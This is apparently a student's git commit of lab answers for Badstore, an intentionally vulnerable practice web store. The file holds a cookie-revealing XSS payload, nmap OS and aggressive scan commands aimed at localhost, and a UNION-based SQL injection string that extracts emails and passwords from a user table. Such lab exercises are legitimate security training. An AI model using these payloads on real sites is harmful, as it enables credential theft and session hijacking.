45474bdea6bf99b371a7ce56348df0927daa86d9
Imperial <imperialgaming9805@gmail.com>
2026-04-11 00:30:42 +0530

    Create 6.py

---
+++ 6.py
@@ -0,0 +1,11 @@
+
+6a Badstore(same as 5a)
+<script>alert(document.cookie)</script>
+
+6b 
+nmap -O 127.0.1.1
+
+nmap -A 127.0.1.1
+
+6c Badstore
+xx' IN (itemnum,sdesc,ldesc) union select email,passwd,123,123 from userdb LIMIT 2 --
